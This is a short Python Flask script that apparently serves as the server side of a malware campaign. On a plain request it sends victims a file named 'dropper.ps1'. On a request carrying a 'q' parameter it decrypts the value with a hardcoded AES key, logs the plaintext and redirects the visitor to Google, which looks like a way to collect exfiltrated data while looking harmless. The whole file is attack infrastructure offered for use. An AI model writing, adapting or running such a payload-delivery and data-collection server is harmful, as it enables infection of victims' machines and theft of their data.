from flask import Flask, redirect, request, send_file
from Crypto.Cipher import AES
from base64 import b64decode
from binascii import unhexlify

app = Flask(__name__)

@app.route('/search')
def index():
    query = request.args.get('q')
    if query:
        aes = AES.new(b64decode("c2RqYWhsZGtzYWprZGx3YQ=="), mode=AES.MODE_ECB)
        decrypted = aes.decrypt(unhexlify(b64decode(query).replace(b':', b'')))
        print(decrypted.decode().strip())
        return redirect('https://google.com/', code=301)
    else:
        return send_file('./dropper.ps1')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
